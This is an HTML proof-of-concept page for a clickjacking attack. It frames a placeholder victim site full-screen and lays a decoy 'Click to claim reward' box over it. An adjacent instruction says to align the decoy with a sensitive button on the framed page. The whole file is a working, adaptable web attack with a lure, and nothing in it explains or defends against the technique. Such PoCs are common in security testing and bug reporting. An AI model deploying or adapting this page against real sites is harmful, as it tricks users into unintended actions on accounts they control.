<!doctype html>
<!-- Clickjacking overlay PoC -->
<html>
<head>
  <meta charset="utf-8">
  <title>Clickjacking PoC</title>
  <meta name="referrer" content="no-referrer">
  <style>
    body { margin: 0; font-family: system-ui, sans-serif; }
    .wrap { position: relative; width: 100vw; height: 100vh; overflow: hidden; }
    iframe {
      position: absolute; inset: 0;
      width: 100%; height: 100%;
      border: 0;
      opacity: 0.85; /* adjust */
      pointer-events: auto;
    }
    /* Decoy overlay */
    .overlay {
      position: absolute;
      top: 120px; left: 120px; /* adjust */
      z-index: 2;
      padding: 14px 18px;
      background: rgba(255,255,255,0.95);
      border: 1px solid #ccc;
      border-radius: 10px;
      box-shadow: 0 4px 18px rgba(0,0,0,0.2);
    }
  </style>
</head>
<body>
  <div class="wrap">
    <iframe src="https://victim.example/page"></iframe>

    <div class="overlay">
      <div style="margin-bottom:8px;">Click to claim reward</div>
      <button onclick="alert('Decoy clicked')">Continue</button>
      <div style="font-size:12px; opacity:0.7; margin-top:8px;">
        Adjust overlay position/opacity to align with a sensitive button underneath.
      </div>
    </div>
  </div>
</body>
</html>
